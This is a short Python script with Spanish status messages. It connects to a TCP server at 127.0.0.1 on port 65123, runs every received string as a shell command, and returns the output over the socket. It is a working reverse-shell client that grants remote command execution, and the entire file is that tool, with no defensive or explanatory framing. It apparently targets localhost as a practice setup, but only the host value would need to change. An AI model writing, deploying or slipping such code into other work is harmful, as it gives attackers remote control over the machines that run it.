import socket
import subprocess
from colorama import Fore, Back, Style
HOST = "127.0.0.1"
PORT = 65123

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sc:
    print("Esperando conexiones...")
    sc.connect((HOST, PORT))
    print("Se logro conectar con el servidor!")

    while True:
        data = sc.recv(1024)
        try:
            output = subprocess.check_output(data.decode("ascii", errors='ignore'), shell=True)
            sc.sendall(output)
        except subprocess.SubprocessError as error:
            print(f'{Fore.RED}No se pudo ejecutar bien el comando, subprocess dice: {error}')
            print(Style.RESET_ALL)
            sc.close()
            break
